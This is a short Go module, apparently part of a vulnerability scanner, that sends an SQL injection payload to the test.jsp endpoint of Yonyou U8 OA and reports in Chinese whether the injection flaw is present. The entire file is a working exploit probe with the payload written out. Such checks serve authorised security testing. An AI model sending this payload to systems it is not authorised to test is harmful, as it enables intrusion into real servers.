package U8_OA_test_sqjni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
	resp, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Get(url)
	if err != nil {
		color.Red.Println("[-] 用友 U8 OA test.jsp SQL注入漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 U8 OA test.jsp SQL注入漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 OA test.jsp SQL注入漏洞不存在")
}
